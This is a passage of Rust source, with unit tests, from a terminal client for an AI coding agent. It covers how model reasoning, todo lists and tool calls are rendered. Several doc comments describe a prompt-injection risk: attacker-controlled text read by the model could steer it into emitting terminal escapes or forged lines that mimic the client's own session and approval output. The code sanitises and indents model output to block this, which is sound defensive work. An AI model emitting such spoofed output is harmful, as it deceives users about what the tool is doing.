/// Rows a whole fully-shown thinking block may occupy.
///
/// A per-line ceiling is not enough on its own: one line may wrap to twenty rows, so two thousand
/// lines of reasoning fill forty thousand rows of terminal. Generous, because `show_content = true`
/// is a request to see the reasoning, and the cut keeps the end, where a conclusion lives.
const THINKING_MAX_ROWS: usize = 400;

/// Fixed chrome in `Thinking... <preview>`.
const THINKING_PREFIX: &str = "Thinking... ";

/// Flatten `text` onto one line, stopping once there is more than `max_chars` to show.
///
/// Reasoning tends to open with a short header (`Key facts:`, `Plan:`) and put the substance on the
/// lines below it. Previewing only up to the first newline therefore spent the whole line on the
/// header, so words are pulled up across line breaks until the budget is full instead.
///
/// The early exit is what keeps this from copying a block that can run to tens of kilobytes in
/// order to show one line of it.
///
/// Deliberately counting *characters* while the real cut is by *column*: a character count is never
/// greater than the column count of the same text, so stopping one character past the budget can
/// never leave [`truncate_to_width`] short of material. Measuring columns here would mean widths
/// per word for no gain.
fn collapse_to_line(text: &str, max_chars: usize) -> String {
    let mut collapsed = String::new();
    for word in text.split_whitespace() {
        if !collapsed.is_empty() {
            collapsed.push(' ');
        }
        collapsed.push_str(word);
        if collapsed.chars().count() > max_chars {
            break;
        }
    }
    collapsed
}

/// Render a thinking block, in full or as a one-line preview.
///
/// Reasoning is model output and gets the same escape-stripping as a tool argument. It is not
/// merely defensive: a model that has read attacker-controlled text (a fetched page, a tool result)
/// can be steered into emitting escapes. Streamed assistant text is sanitised for the same reason,
/// in [`StreamingRenderer::push_delta`] -- passing through the markdown renderer is not a defence,
/// since termimad writes a `Compound`'s bytes verbatim and syntect passes the source slice through.
/// The preview sanitises after collapsing rather than before, so the early exit in
/// [`collapse_to_line`] still bounds the work on a block that can run to tens of kilobytes;
/// collapsing only concatenates, so nothing an escape could hide behind survives the later pass.
pub fn render_thinking_block(thinking: &str, show_full: bool) {
    eprintln!(
        "{}{}",
        THINKING_PREFIX.with(Color::DarkGrey),
        thinking_block_text(thinking, show_full, output_width()).with(Color::DarkGrey),
    );
}

/// The text [`render_thinking_block`] prints, separated from the printing so both branches can be
/// held to the escape-stripping the doc comment above promises.
fn thinking_block_text(thinking: &str, show_full: bool, width: usize) -> String {
    // Only the first line carries `Thinking... `; the rest carry the indent added below.
    let first_line_budget = width.saturating_sub(display_width(THINKING_PREFIX));
    let rest_budget = width.saturating_sub(display_width(TOOL_PARAM_INDENT));
    if show_full {
        // Sanitised per line, and every line but the first is indented.
        //
        // Stripping escapes is not enough on its own here. `Thinking... ` prefixes only the first
        // line, so line two onward would sit at column zero in the same grey that
        // `render_session_id` and `render_hint` use, and a model needs no trick at all to write a
        // second line reading `Continuing session: <uuid>`. It renders byte-for-byte identically to
        // the real thing. The indent is the same boundary the argument block relies on: meka's own
        // chrome starts at column zero, so nothing quoted from the model may.
        //
        // Wrapped rather than cut. `show_content = true` means "print the block", and reasoning is
        // prose whose end carries the conclusion, so truncating each line to the width would
        // silently drop it. The argument block chose wrapping over cutting for the same reason.
        let mut rows: Vec<String> = thinking
            .lines()
            .enumerate()
            .flat_map(|(index, line)| {
                let flattened = sanitize_to_line(line, usize::MAX);
                let budget = if index == 0 {
                    first_line_budget
                } else {
                    rest_budget
                };
                wrap_to_width(&flattened, budget, THINKING_MAX_ROWS_PER_LINE)
                    .into_iter()
                    .enumerate()
                    .map(move |(row, text)| {
                        // Only the very first row rides behind `Thinking... `. Everything else,
                        // including a continuation of the first line, is indented.
                        if index == 0 && row == 0 {
                            text
                        } else {
                            format!("{}{}", TOOL_PARAM_INDENT, text)
                        }
                    })
                    .collect::<Vec<_>>()
            })
            .collect();
        cap_rows(&mut rows, THINKING_MAX_ROWS, TOOL_PARAM_INDENT, width);
        rows.join("\n")
    } else {
        // No second truncation: `sanitize_to_line` ends in one, to the same budget.
        sanitize_to_line(
            &collapse_to_line(thinking, first_line_budget),
            first_line_budget,
        )
    }
}

/// Render the todo list to stderr. Returns `true` if anything was printed, so the caller only
/// advances `OutputSpacing` when there was actually output; an empty list prints nothing and must
/// not claim a trailing blank line (otherwise the next text run loses its leading blank).
pub fn render_todo_list(title: Option<&str>, items: &[crate::tools::todo::TodoItem]) -> bool {
    use crate::tools::todo::TodoStatus;

    if items.is_empty() {
        return false;
    }
    let width = output_width();
    eprintln!();

    eprintln!("{}", todo_heading(title, width).with(Color::White).bold());
    eprintln!();

    for (index, item) in items.iter().enumerate() {
        let color = match item.status {
            TodoStatus::Completed => Color::Green,
            TodoStatus::InProgress => Color::Yellow,
            TodoStatus::Pending | TodoStatus::Cancelled => Color::DarkGrey,
        };
        // Composed uncoloured first, then coloured, so the width a test measures is the width that
        // prints. Colouring in place would put escape bytes in the middle of the string.
        let row = todo_row(index, item, width);
        let (marker, rest) = row.split_at(row.find(' ').map_or(0, |space| space + 1));
        eprintln!("{}{}", marker, rest.with(color));
    }

    eprintln!();
    true
}

/// The `TODO: <title>` heading, not indented, with a fallback when the model omitted a title.
///
/// Title and item text are both model-supplied, and this list prints at column zero, so a `\n` or a
/// `\r` in either needs no trick at all to place a forged line among meka's own output. Separated
/// from the printing so that is testable.
fn todo_heading(title: Option<&str>, width: usize) -> String {
    const PREFIX: &str = "TODO: ";
    format!(
        "{}{}",
        PREFIX,
        sanitize_to_line(
            title.unwrap_or("Tasks"),
            width.saturating_sub(display_width(PREFIX))
        )
    )
}

/// One task's whole row, chrome included, fitted to `width`.
///
/// The chrome is computed here rather than at the call site so a test can hold the real budget to
/// the real width. Held apart, a test that recomputed the subtraction itself passed even with the
/// caller's subtraction deleted.
fn todo_row(index: usize, item: &crate::tools::todo::TodoItem, width: usize) -> String {
    use crate::tools::todo::TodoStatus;

    let marker = match item.status {
        TodoStatus::Completed => "[x]",
        TodoStatus::InProgress => "[~]",
        TodoStatus::Pending => "[ ]",
        TodoStatus::Cancelled => "[-]",
    };
    let number = (index + 1).to_string();
    // `- `, the marker, a space, the task number and a space; none of it model-supplied.
    let chrome = "- ".len() + marker.len() + 1 + number.len() + 1;
    format!(
        "- {} {} {}",
        marker,
        number,
        todo_item_text(item, width.saturating_sub(chrome))
    )
}

/// One task's text, prefixed when cancelled. Sanitised for the reason on [`todo_heading`].
fn todo_item_text(item: &crate::tools::todo::TodoItem, budget: usize) -> String {
    const CANCELLED: &str = "(cancelled) ";
    if item.status == crate::tools::todo::TodoStatus::Cancelled {
        let text = sanitize_to_line(&item.text, budget.saturating_sub(display_width(CANCELLED)));
        // Truncated as one string, not just the part after the prefix: below twelve columns the
        // subtraction above leaves nothing and the prefix alone is already over budget.
        truncate_to_width(&format!("{}{}", CANCELLED, text), budget)
    } else {
        sanitize_to_line(&item.text, budget)
    }
}

pub fn tool_display_name_for_approval(name: &str) -> &str {
    tool_display_name(name)
}

/// Resolve the summary string shown next to a tool-call indicator and in the approval prompt. Tries
/// the hardcoded built-in map first; falls back to the tool's JSON schema `required[0]` when
/// provided (covers MCP tools, whose schemas are authored upstream and can't be enumerated here).
pub fn resolve_primary_param(
    name: &str,
    input: &serde_json::Value,
    schema: Option<&serde_json::Value>,
) -> Option<String> {
    if let Some(value) = builtin_primary_param(name, input) {
        return Some(value);
    }
    schema.and_then(|s| schema_primary_param(s, input))
}

/// The label a tool indicator shows for a built-in.
///
/// One entry per name in [`crate::tools::BUILTIN_TOOL_NAMES`], in PascalCase, enforced by
/// `every_builtin_tool_has_a_display_name`. Both halves of that are the point. The table had
/// drifted into three styles at once, and whole families were absent: `skill_search` rendered as
/// "Search skills" in the same transcript where its sibling `memory_search` rendered raw, because
/// the memory family was never added. AGENTS.md already requires updating this table when a tool is
/// *renamed*; nothing said anything about adding one, so every tool added after the table was
/// written fell through to `other` and nothing noticed.
fn tool_display_name(name: &str) -> &str {
    match name {
        "agent_delete" => "AgentDelete",
        "agent_followup" => "AgentFollowup",
        "agent_list" => "AgentList",
        "agent_spawn" => "AgentSpawn",
        "context_check" => "ContextCheck",
        "context_compact" => "ContextCompact",
        "conversation_read" => "ConversationRead",
        "conversation_search" => "ConversationSearch",
        "edit_file" => "EditFile",
        "execute_command" => "Shell",
        "fetch_url" => "FetchUrl",
        "find_files" => "FindFiles",
        "load_tool" => "LoadTool",
        "mcp_prompt_get" => "McpPromptGet",
        "mcp_prompt_list" => "McpPromptList",
        "mcp_resource_list" => "McpResourceList",
        "mcp_resource_read" => "McpResourceRead",
        "mcp_resource_subscribe" => "McpResourceSubscribe",
        "mcp_resource_unsubscribe" => "McpResourceUnsubscribe",
        "mcp_resource_updates_list" => "McpResourceUpdatesList",
        "memory_delete" => "MemoryDelete",
        "memory_read" => "MemoryRead",
        "memory_search" => "MemorySearch",
        "memory_write" => "MemoryWrite",
        "read_file" => "ReadFile",
        "render_image" => "RenderImage",
        "schedule_cancel" => "ScheduleCancel",
        "schedule_create" => "ScheduleCreate",
        "schedule_list" => "ScheduleList",
        "scratchpad_delete" => "ScratchpadDelete",
        "scratchpad_edit" => "ScratchpadEdit",
        "scratchpad_list" => "ScratchpadList",
        "scratchpad_load_file" => "ScratchpadLoadFile",
        "scratchpad_merge" => "ScratchpadMerge",
        "scratchpad_read" => "ScratchpadRead",
        "scratchpad_rename" => "ScratchpadRename",
        "scratchpad_save_file" => "ScratchpadSaveFile",
        "scratchpad_write" => "ScratchpadWrite",
        "search_contents" => "SearchContents",
        "search_web" => "SearchWeb",
        "skill_delete" => "SkillDelete",
        "skill_read" => "Skill",
        "skill_search" => "SkillSearch",
        "skill_write" => "SkillWrite",
        "task_cancel" => "TaskCancel",
        "task_list" => "TaskList",
        "todo" => "Todo",
        "write_file" => "WriteFile",
        // An MCP tool's name is the server's, not meka's, so it is shown as the server spells it.
        other => other,
    }
}

/// The `/compact` confirmation line.
///
/// Names the memories the checkpoint turn wrote, because they are durable and instance-scoped:
/// leaving them unmentioned would let notes accumulate invisibly under a command whose name
/// suggests it only removes things. Derived from the calls that actually ran, never self-reported.
pub fn compaction_summary(outcome: &crate::agent::CompactOutcome) -> String {
    let mut line = String::from("Session compacted");
    if !outcome.kept_recent {
        line.push_str(" (recent turns discarded too)");
    }
    line.push('.');
    match outcome.source {
        crate::agent::CompactSource::Checkpoint => {}
        // Both fallbacks are worth naming: the summary is not the one the agent chose to write, so
        // a user comparing results across compactions has an explanation for the difference.
        crate::agent::CompactSource::CheckpointText => {
            line.push_str(
                " The checkpoint ended without submitting, so its closing text was used.",
            );
        }
        crate::agent::CompactSource::Summarizer => {
            line.push_str(" Summarized without a checkpoint.");
        }
    }
    if !outcome.memories_written.is_empty() {
        line.push_str(&format!(
            " Wrote {} {}: {}.",
            outcome.memories_written.len(),
            if outcome.memories_written.len() == 1 {
                "memory"
            } else {
                "memories"
            },
            outcome.memories_written.join(", "),
        ));
    }
    line
}

/// Capturing this process's `tracing` output for the current thread, for tests that assert on a
/// log line.
///
/// Here rather than in either module that needs it, because there can only be one of these. The
/// subscriber has to be installed **globally**: `tracing` caches a callsite's interest process-wide
/// the first time it is evaluated, so a thread-local subscriber loses a race it cannot see -- a
/// sibling test reaching the same `warn!` first, with no subscriber installed, registers the
/// callsite as never-enabled, and every later capture of it comes back empty. That is a flake of
/// roughly 2 runs in 10, which is worse than a loud failure because it reads as a CI hiccup.
///
/// Only one global can be installed, so a second copy of this helper does not merely duplicate
/// code: the loser's `set_global_default` fails, its buffer is never written to, and its tests
/// break. `src/skills.rs` and `src/schedule.rs` each grew their own and collided exactly that way.
/// The buffer stays thread-local, which is what keeps concurrent tests out of each other's output.
#[cfg(test)]
pub(crate) mod log_capture {
    use std::{cell::RefCell, io, sync::OnceLock};

    thread_local! {
        static BUFFER: RefCell<Vec<u8>> = const { RefCell::new(Vec::new()) };
    }

    struct ThreadLocalWriter;

    impl io::Write for ThreadLocalWriter {
        fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
            BUFFER.with(|buffer| buffer.borrow_mut().extend_from_slice(buf));
            Ok(buf.len())
        }

        fn flush(&mut self) -> io::Result<()> {
            Ok(())
        }
    }

    impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for ThreadLocalWriter {
        type Writer = Self;

        fn make_writer(&'a self) -> Self::Writer {
            ThreadLocalWriter
        }
    }

    /// Begin capturing on this thread, discarding anything already buffered.
    ///
    /// Safe to call from any number of threads and any number of times; the subscriber is installed
    /// once and the buffer it writes to is whichever thread is logging.
    ///
    /// Installed at `INFO` rather than `WARN` because one caller needs to assert an `info!`: the
    /// line that says a sweep was bounded, which exists so a capped run does not read as a complete
    /// one. Only one global subscriber can exist, so the level has to satisfy every caller and each
    /// one filters what it wants -- see [`warnings`] and [`infos`]. Capturing more than is asserted
    /// is the safe direction; a caller that asserts *silence* must filter, or an unrelated `info!`
    /// will fail it.
    pub(crate) fn start() {
        static INSTALLED: OnceLock<()> = OnceLock::new();
        INSTALLED.get_or_init(|| {
            let subscriber = tracing_subscriber::fmt()
                .with_writer(ThreadLocalWriter)
                .with_max_level(tracing::Level::INFO)
                .with_ansi(false)
                .without_time()
                .finish();
            // An already-installed global is not worth failing a test over: what this needs is for
            // the callsites it asserts on to be *enabled*. Reported rather than discarded, since a
            // future change that breaks capture would otherwise do it silently and every assertion
            // built on this would start passing vacuously.
            if let Err(error) = tracing::subscriber::set_global_default(subscriber) {
                eprintln!("log capture: a global subscriber was already installed: {error}");
            }
        });
        BUFFER.with(|buffer| buffer.borrow_mut().clear());
    }

    /// What this thread has logged since [`start`], every level together.
    pub(crate) fn captured() -> String {
        BUFFER.with(|buffer| String::from_utf8_lossy(&buffer.borrow()).into_owned())
    }

    /// Only the `WARN` lines. What a caller asserting "this warned once, not once per tick" wants,
    /// and what a caller asserting silence *must* use.
    pub(crate) fn warnings() -> String {
        at_level("WARN")
    }

    /// Only the `INFO` lines.
    pub(crate) fn infos() -> String {
        at_level("INFO")
    }

    /// The subscriber writes the level as the first token of each event, so selecting one is a
    /// filter over the text. A multi-line event keeps its continuation lines with the line that
    /// names the level.
    ///
    /// Matched as that leading token and not with `contains`, which is a trap this got wrong
    /// first time: `contains` finds a level name anywhere in the line, including inside the
    /// *message*, and returns the first candidate in the array rather than the line's real level.
    /// A `WARN` about a gate watching a log -- `grep ERROR ...`, the example the docs themselves
    /// use -- was filed as ERROR and dropped, so an assertion counting warnings silently
    /// undercounted.
    fn at_level(level: &str) -> String {
        let mut kept = String::new();
        let mut keeping = false;
        for line in captured().lines() {
            let leading = line.split_whitespace().next().unwrap_or_default();
            if ["ERROR", "WARN", "INFO", "DEBUG", "TRACE"].contains(&leading) {
                keeping = leading == level;
            }
            if keeping {
                kept.push_str(line);
                kept.push('\n');
            }
        }
        kept
    }
}

/// Whether [`builtin_primary_param`] answers for `name` given an input shaped like `parameters`.
///
/// The probe is built from the tool's own declared properties, not from a fixed list of keys, and
/// that is the whole point. A rule keyed to a parameter the tool does not declare - a typo, or a
/// parameter renamed long afterwards - satisfies a hand-written probe happily while returning
/// `None` for every real call, and the tool silently goes back to rendering bare. Renaming
/// `schedule_cancel`'s `id` to `job_id` failed only that tool's own two behavioural tests; nothing
/// anywhere said the indicator had lost its argument.
///
/// Drives `test_every_tool_with_arguments_can_show_a_primary_param`, which is in `crate::tools`
/// because that is where the schemas are.
#[cfg(test)]
pub fn primary_param_answers_for_schema(name: &str, parameters: &serde_json::Value) -> bool {
    let mut probe = serde_json::Map::new();
    if let Some(properties) = parameters.get("properties").and_then(|p| p.as_object()) {
        for (key, property) in properties {
            // Typed, because a rule may read a value rather than only its presence: `task_cancel`
            // branches on `all` being `true`, and a string there would take the wrong arm.
            let value = match property.get("type").and_then(|t| t.as_str()) {
                Some("integer" | "number") => serde_json::json!(1),
                Some("boolean") => serde_json::json!(true),
                Some("array") => serde_json::json!(["x"]),
                Some("object") => serde_json::json!({"x": "y"}),
                _ => serde_json::json!("x"),
            };
            probe.insert(key.clone(), value);
        }
    }
    builtin_primary_param(name, &serde_json::Value::Object(probe)).is_some()
}

/// The built-ins that take no argument of their own, and so need no rule below.
///
/// The complement of [`builtin_primary_param`]'s coverage over
/// [`crate::tools::BUILTIN_TOOL_NAMES`]. Stated rather than derived because most of these are
/// `list` tools that could grow a filter later, and a new property on one of them must be a
/// decision to revisit the entry rather than a silent exemption;
/// `test_every_tool_with_arguments_can_show_a_primary_param` checks every entry against the tool's
/// real schema and fails either way round.
#[cfg(test)]
pub const BUILTINS_WITHOUT_ARGUMENTS: &[&str] = &[
    "agent_list",
    "context_check",
    "mcp_resource_updates_list",
    "schedule_list",
    "scratchpad_list",
    "task_list",
];

/// The argument a tool-call indicator shows next to the tool's name.
///
/// One rule per name in [`crate::tools::BUILTIN_TOOL_NAMES`] that takes an argument, the complement
/// of `BUILTINS_WITHOUT_ARGUMENTS`. Covering every one of them is what the map is *for*, not a
/// convenience: [`resolve_primary_param`]'s other half needs the tool's JSON Schema, and replayed
/// history has none, so a built-in missing from here renders bare in `/history` having rendered
/// fully live. `schedule_cancel` shipped that way, replaying as `[tool ScheduleCancel]` with no
/// word of which job was cancelled.
fn builtin_primary_param(name: &str, input: &serde_json::Value) -> Option<String> {
    // `render_image` accepts either `from_scratchpad` or inline `base64`. Show the scratchpad name
    // when present; for inline base64 the payload is opaque so there's nothing useful to display.
    if name == "render_image" {
        if let Some(from) = input.get("from_scratchpad").and_then(|v| v.as_str()) {
            return Some(from.to_string());
        }
        if input.get("base64").is_some() {
            return Some("<inline base64>".to_string());
        }
        return None;
    }

    // `todo` has no single primary key. Surface what the agent is doing, preferring the status
    // transitions, then the `title` of a list it is building, then the list size, and finally
    // "read" for an argument-less read.
    if name == "todo" {
        if let Some(set) = input.get("set").and_then(|v| v.as_object()) {
            let parts: Vec<String> = set
                .iter()
                .filter_map(|(id, status)| {
                    status.as_str().map(|status| format!("#{} {}", id, status))
                })
                .collect();
            if !parts.is_empty() {
                return Some(parts.join(", "));
            }
        }
        if let Some(title) = input.get("title").and_then(|v| v.as_str()) {
            let title = title.trim();
            if !title.is_empty() {
                return Some(title.to_string());
            }
        }
        if let Some(items) = input.get("items").and_then(|v| v.as_array()) {
            let count = items.len();
            return Some(format!(
                "{} task{}",
                count,
                if count == 1 { "" } else { "s" }
            ));
        }
        return Some("read".to_string());
    }

    // `task_cancel` takes either an id or `all`, and declares neither as required, so there is no
    // `required[0]` for the schema fallback to reach for. Without this the indicator would render
    // the tool name with no argument, which is the one thing a cancellation must be specific about.
    if name == "task_cancel" {
        if input
            .get("all")
            .and_then(serde_json::Value::as_bool)
            .unwrap_or(false)
        {
            return Some("all".to_string());
        }
        return input.get("id").and_then(|v| v.as_str()).map(str::to_string);
    }

    // Sorted, like `tool_display_name` and `BUILTIN_TOOL_NAMES`, so the three can be read against
    // each other. Mostly this agrees with the schema's own `required[0]`, which is what the live
    // path would have fallen back to; where it does not, the schema's first required key names the
    // server a call is addressed to rather than the thing it acts on, and the object is what a
    // reader wants (`mcp_resource_read` shows the URI, not which server holds it).
    let key = match name {
        "agent_delete" | "agent_followup" => "agent",
        "agent_spawn" => "prompt",
        "context_compact" => "instructions",
        "conversation_read" => "start",
        "conversation_search" => "query",
        "edit_file" | "read_file" | "write_file" => "path",
        "execute_command" => "command",
        "fetch_url" => "url",
        "find_files" | "search_contents" => "pattern",
        "load_tool" => "name",
        "mcp_prompt_get" => "name",
        "mcp_prompt_list" | "mcp_resource_list" => "server",
        "mcp_resource_read" | "mcp_resource_subscribe" | "mcp_resource_unsubscribe" => "uri",
        "memory_delete" | "memory_read" | "memory_write" => "name",
        "memory_search" => "queries",
        "schedule_cancel" => "id",
        "schedule_create" => "prompt",
        "scratchpad_delete" | "scratchpad_edit" | "scratchpad_read" | "scratchpad_write" => "name",
        "scratchpad_load_file" => "path",
        "scratchpad_merge" => "sources",
        "scratchpad_rename" => "old",
        "scratchpad_save_file" => "name",
        "search_web" => "query",
        "skill_delete" | "skill_read" | "skill_write" => "name",
        "skill_search" => "pattern",
        _ => return None,
    };
    // Coerced rather than read as a string: `load_tool` takes a name or a list of them,
    // `memory_search` takes a list of phrasings, and `conversation_read` takes a number. Reading
    // only `as_str` returned `None` for all three, which sent the live path to the schema fallback
    // -- where the same value went through this very function -- and left the replayed line bare.
    input.get(key).and_then(coerce_display_value)
}

/// Fallback for tools not covered by the built-in map (MCP tools, dynamically-registered tools,
/// etc.). Uses the first entry of `inputSchema.required` as the key into `input` and coerces the
/// value to a short display string. Returns `None` when the schema offers no `required` field, the
/// required key is missing from `input`, or the value type has no sensible string form (e.g. nested
/// objects / binary blobs).
fn schema_primary_param(schema: &serde_json::Value, input: &serde_json::Value) -> Option<String> {
    let required = schema.get("required")?.as_array()?;
    let key = required.iter().find_map(|v| v.as_str())?;
    let value = input.get(key)?;
    coerce_display_value(value)
}

fn coerce_display_value(value: &serde_json::Value) -> Option<String> {
    match value {
        serde_json::Value::String(s) => {
            if s.is_empty() {
                None
            } else {
                Some(s.clone())
            }
        }
        serde_json::Value::Number(n) => Some(n.to_string()),
        serde_json::Value::Bool(b) => Some(b.to_string()),
        serde_json::Value::Array(arr) => {
            let parts: Vec<String> = arr
                .iter()
                .filter_map(|v| match v {
                    serde_json::Value::String(s) if !s.is_empty() => Some(s.clone()),
                    serde_json::Value::Number(n) => Some(n.to_string()),
                    serde_json::Value::Bool(b) => Some(b.to_string()),
                    _ => None,
                })
                .collect();
            if parts.is_empty() {
                None
            } else {
                Some(parts.join(", "))
            }
        }
        _ => None,
    }
}

#[cfg(test)]
mod tests {

    /// A level name inside a *message* must not be mistaken for the line's level.
    ///
    /// `at_level` matched with `contains` and returned the first candidate in its array, so a
    /// `WARN` whose text mentioned "ERROR" was filed as ERROR and dropped. A gate watching a log
    /// (`grep ERROR ...`, the docs' own example) puts exactly that into a warning, and every
    /// assertion built on `warnings()` would have undercounted in silence.
    #[test]
    fn log_capture_files_a_line_by_its_level_not_by_its_message() {
        log_capture::start();
        tracing::warn!("gate for job abc failed: grep ERROR /var/log/app returned nothing");
        tracing::info!("held over 3 due job(s)");

        let warnings = log_capture::warnings();
        assert!(
            warnings.contains("grep ERROR"),
            "a warning whose message names another level is still a warning: {warnings:?}"
        );
        assert!(
            !warnings.contains("held over"),
            "and an info line is not one: {warnings:?}"
        );
        assert!(
            log_capture::infos().contains("held over"),
            "which is where it does belong"
        );
    }

    /// Every built-in has a label, and every label is spelled the same way.
    ///
    /// The table this guards is hand-maintained and had gone stale in both directions at once: the
    /// whole `memory_*` family, all four later `scratchpad_*` tools, `schedule_*`, `task_*`,
    /// `load_tool`, `conversation_*` and the MCP meta-tools fell through to the raw name, while
    /// three `skill_*` entries used sentence case. A live transcript showed
    /// `[tool Search skills(...)]` one line above `[tool memory_search(...)]`.
    ///
    /// Asserting the style as well as the presence is what makes the test worth having: a mapping
    /// added as `"memory_search" => "Search memories"` satisfies "has an entry" and reintroduces
    /// exactly the inconsistency this exists to stop.
    #[test]
    fn every_builtin_tool_has_a_display_name() {
        let missing: Vec<&str> = crate::tools::BUILTIN_TOOL_NAMES
            .iter()
            .copied()
            .filter(|name| super::tool_display_name(name) == *name)
            .collect();
        assert!(
            missing.is_empty(),
            "built-ins with no display name, so they render as raw snake_case next to labelled \
             siblings: {missing:?}"
        );

        let misspelled: Vec<(&str, &str)> = crate::tools::BUILTIN_TOOL_NAMES
            .iter()
            .copied()
            .map(|name| (name, super::tool_display_name(name)))
            .filter(|(_, label)| {
                !label
                    .chars()
                    .next()
                    .is_some_and(|first| first.is_ascii_uppercase())
                    || !label.chars().all(|c| c.is_ascii_alphanumeric())
            })
            .collect();
        assert!(
            misspelled.is_empty(),
            "display names are PascalCase with no spaces, so one transcript reads in one voice: \
             {misspelled:?}"
        );
    }

    /// The window is reported from turn zero, before there is any occupancy to divide into it.
    ///
    /// It is no longer inferred from the model name, so `/status` is the only place a user can
    /// check the number their session budgets against - and a wrong one is invisible until
    /// compaction misbehaves several turns later. Waiting for the first turn to show it means the
    /// setting can only be verified by spending a turn, which is the wrong way round.
    #[test]
    fn the_context_window_is_reported_before_the_first_turn() {
        use crate::provider::ThinkingMode;

        let snap = crate::stats::SessionStats::default().snapshot();
        let model = ModelStatus {
            model: Some("some-local-model"),
            profile: Some("local"),
            backend: Some("anthropic-messages"),
            effort: None,
            thinking: ThinkingMode::Adaptive,
        };

        // Nothing sent yet: the window still has to appear, at zero occupancy.
        let fresh = format_session_status(&snap, &model, 0, 0, 262_144);
        assert!(fresh.contains("Context:"), "{fresh}");
        assert!(
            fresh.contains("0 / 262.1k"),
            "the configured window: {fresh}"
        );

        // Once a turn has run, the same line carries the occupancy.
        let used = format_session_status(&snap, &model, 2, 65_536, 262_144);
        assert!(used.contains("25% used"), "{used}");

        // An unknown window (sub-agents, tests) still has nothing to report.
        let unknown = format_session_status(&snap, &model, 0, 0, 0);
        assert!(!unknown.contains("Context:"), "{unknown}");
    }

    /// The resolved-profile lines come in the order `[providers.<name>]` declares the same fields,
    /// so the block and the config it was resolved from can be read side by side. Nothing enforced
    /// that before, and the two had already drifted: `Model` sat above `Provider`, and `Context`
    /// sat down among the cumulative counters rather than with the window it reports.
    #[test]
    fn the_status_block_follows_the_profile_field_order() {
        use crate::provider::ThinkingMode;

        let snap = crate::stats::SessionStats::default().snapshot();
        let body = format_session_status(
            &snap,
            &ModelStatus {
                model: Some("some-model"),
                profile: Some("p"),
                backend: Some("anthropic-messages"),
                effort: Some("high"),
                thinking: ThinkingMode::Adaptive,
            },
            7,
            1_024,
            262_144,
        );

        let labels: Vec<&str> = body
            .lines()
            .filter_map(|line| line.trim_start().split(':').next())
            .collect();
        assert_eq!(
            labels,
            vec![
                // `type`, `model`, `context_window`, `effort`, `thinking` -- the profile's own
                // order, for the fields that come from it.
                "Provider",
                "Model",
                "Context",
                "Effort",
                "Thinking",
                // Then what the session has spent, which no profile field describes.
                "Turns",
                "Input tokens",
                "Output tokens",
                "Redactions",
                "Messages",
            ],
            "{body}"
        );
    }

    /// `/status` reports what the request actually carries, not what meka happens to hold.
    ///
    /// Both of these lines are conditional for the same reason: `effort` is omitted when the
    /// profile sets none, because the provider then picks its own, and `thinking` is omitted on a
    /// backend whose requests have no such field. Printing either unconditionally states a setting
    /// that is not in force - which is exactly what the status block exists to rule out.
    #[test]
    fn the_status_block_omits_settings_the_request_does_not_carry() {
        use crate::provider::ThinkingMode;

        let snap = crate::stats::SessionStats::default().snapshot();
        let body = |backend: &'static str, effort: Option<&'static str>| {
            format_session_status(
                &snap,
                &ModelStatus {
                    model: Some("some-model"),
                    profile: Some("p"),
                    backend: Some(backend),
                    effort,
                    thinking: ThinkingMode::Adaptive,
                },
                0,
                0,
                0,
            )
        };

        let claude = body("anthropic-messages", Some("xhigh"));
        assert!(claude.contains("Thinking:"), "{claude}");
        assert!(claude.contains("Effort:"), "{claude}");

        // An OpenAI request has no `thinking` field, whatever mode the struct carries.
        let openai = body("openai-chat-completions", Some("high"));
        assert!(!openai.contains("Thinking:"), "{openai}");

        // Unset effort means the provider's own default, so there is no tier to report.
        let unset = body("anthropic-messages", None);
        assert!(!unset.contains("Effort:"), "{unset}");
    }
    /// Everything meka prints on its own line has to start from a known attribute state.
    ///
    /// `ESC[K` erases *using the current attributes*, so clearing the row does not undo a
    /// model-controlled `ESC[8m` that reached the terminal -- it re-applies it to the cleared
    /// cells. Everything printed after, including the `[ask]` prompt this call exists to make
    /// legible, then renders concealed. The reset has to lead, and this asserts the order rather
    /// than merely its presence.
    ///
    /// Not on Windows, where crossterm may take the console-API path instead of emitting ANSI.
    #[cfg(not(windows))]
    #[test]
    fn own_line_resets_attributes_before_it_clears_the_row() {
        let mut written = Vec::new();
        super::write_own_line_prelude(&mut written).expect("write to a Vec cannot fail");
        let sequence = String::from_utf8(written).expect("crossterm emits ASCII");

        let reset = sequence
            .find("\u{1b}[0m")
            .expect("an explicit reset must be emitted");
        let clear = sequence
            .find("\u{1b}[K")
            .expect("the row clear must be emitted");
        assert!(
            reset < clear,
            "the reset must precede the clear, or the clear re-applies the attribute it was \
             meant to escape; got {:?}",
            sequence,
        );
    }

    /// The `/compact` line has to name what the checkpoint wrote, because a memory is durable and
    /// instance-scoped: notes accumulating unmentioned under a command called "compact" is the
    /// surprise this reporting exists to prevent.
    #[test]
    fn test_compaction_summary_names_memories_written() {
        let line = super::compaction_summary(&crate::agent::CompactOutcome {
            source: crate::agent::CompactSource::Checkpoint,
            memories_written: vec!["deploy-quirks".to_string(), "rate-limits".to_string()],
            kept_recent: true,
        });
        assert_eq!(
            line,
            "Session compacted. Wrote 2 memories: deploy-quirks, rate-limits."
        );
    }

    #[test]
    fn test_compaction_summary_is_quiet_on_the_ordinary_path() {
        let line = super::compaction_summary(&crate::agent::CompactOutcome {
            source: crate::agent::CompactSource::Checkpoint,
            memories_written: Vec::new(),
            kept_recent: true,
        });
        assert_eq!(line, "Session compacted.");
    }

    /// Both fallbacks are named. A user comparing one compaction against another needs to know the
    /// summary was not the one the agent chose to write.
    #[test]
    fn test_compaction_summary_reports_a_fallback_and_a_discarded_tail() {
        let line = super::compaction_summary(&crate::agent::CompactOutcome {
            source: crate::agent::CompactSource::Summarizer,
            memories_written: Vec::new(),
            kept_recent: false,
        });
        assert_eq!(
            line,
            "Session compacted (recent turns discarded too). Summarized without a checkpoint."
        );
    }

    /// The indicator's label is **not** monotonically wider as the count grows: at a million
    /// `format_token_count` switches suffix, so `1000.0k tokens` (20 columns) becomes `1.0M tokens`
    /// (17). A redraw that erased only its own width would leave three characters of the previous
    /// label stranded on the line.
    ///
    /// Asserted as a counterexample so the drawer's clear-to-end-of-line is not "simplified" back
    /// into width tracking, which looks equivalent and is not.
    #[test]
    fn test_indicator_label_can_shrink_as_the_count_grows() {
        let width = |tokens: u64| {
            format!("Thinking... ({} tokens)", format_token_count(tokens))
                .chars()
                .count()
        };
        assert!(
            width(1_000_000) < width(999_999),
